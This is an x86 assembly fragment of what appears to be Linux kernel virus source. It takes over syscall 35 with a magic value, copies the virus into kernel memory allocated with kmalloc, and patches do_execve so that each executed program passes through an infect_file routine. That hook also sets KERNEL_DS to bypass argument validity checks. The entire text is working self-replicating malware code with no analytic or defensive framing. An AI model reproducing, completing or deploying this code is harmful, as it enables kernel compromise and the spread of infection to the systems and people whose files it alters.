;------------------------------------------------------------------------------
; syscall#35 entry
;	arg1 (virus address in userspace)
;	arg2 (magic)
kmem_patch:	pusha
		mov	ebp, [esp + 36]
		cmp	word [esp + 40], 0xdead
		je	module.kmem_entry
		popa
		mov	eax, -ENOSYS
		ret
;------------------------------------------------------------------------------
module:
.init:		pusha
		call	get_addr
		mov	ebp, eax

.kmem_entry:	push	dword GFP_KERNEL
		push	dword ALLOC_SIZE
		mov	eax, strict dword NOPS
.kmalloc	equ	$ - 4
		call	eax				; kmalloc
		add	esp, byte 8
		or	eax, eax			; == NULL ?
		jz	.failed

		xchg	edx, eax
		
		mov	esi, ebp
		mov	edi, edx
		mov	ecx, VIRUS_SIZE
		cld
		rep	movsb				; copy virus
		
		lea	eax, [edx + O(new_execve)]
		mov	[edx + O(patch.addr)], eax

		mov	esi, strict dword NOPS
.do_execve	equ	$ - 4
		lea	edi, [edx + PBUF_OFFSET]
		push	byte PATCH_SIZE
		pop	ecx
		push	ecx
		rep	movsb				; save old code

		cli
		lea	esi, [edx + O(patch)]
		mov	edi, [edx + O(module.do_execve)]
		pop	ecx
		rep	movsb				; install our code
		sti
		
.failed:	popa
		xor	eax, eax
.cleanup:	ret
PKMEM_SIZE	equ	$ - kmem_patch
;------------------------------------------------------------------------------
patch:		mov	eax, strict dword NOPS
.addr		equ	$ - 4
		jmp	eax
PATCH_SIZE	equ	$ - patch
;------------------------------------------------------------------------------
new_execve:	pusha
		call	get_addr
		mov	ebp, eax		

		cli
		cld		
		lea	esi, [ebp + PBUF_OFFSET]
		mov	edi, [ebp + O(module.do_execve)]
		push	byte PATCH_SIZE
		pop	ecx
		rep	movsb				; restore original code
		sti

; from the <asm/uaccess.h>:
; The fs value determines whether argument validity checking should be
; performed or not.  If get_fs() == USER_DS, checking is performed, with
; get_fs() == KERNEL_DS, checking is bypassed.
		mov	edi, -8192
		and	edi, esp
		lea	edi, [edi + 12]
		mov	ebx, [edi]			; ebx = get_fs()
		xor	eax, eax
		dec	eax
		cmp	eax, ebx
		je	.kernel_call
		mov	[edi], eax			; set_fs(KERNEL_DS)
		mov	eax, [esp + 36]
		cmp	[eax], word 0xdead
		jne	.notcheck
		mov	[edi], ebx
		xor	eax, eax
		jmp	short .return
.notcheck:	lea	ecx, [ebp + IBUF_OFFSET]
		push	ecx
		push	eax
		call	infect_file			; infect_file(filename)
		mov	[edi], ebx			; set_fs(ebx)

.kernel_call:	movb	ecx, 4
.push4:		push	dword [esp + 48]
		loop	.push4
		call	[ebp + O(module.do_execve)]	; do_execve(...)
		add	esp, byte 16
.return:	mov	[esp + 0x1c], eax

		cli
		lea	esi, [ebp + O(patch)]
		mov	edi, [ebp + O(module.do_execve)]
		push	byte PATCH_SIZE
		pop	ecx
		cld
		rep	movsb				; install our code back
		sti

		popa
		ret
;------------------------------------------------------------------------------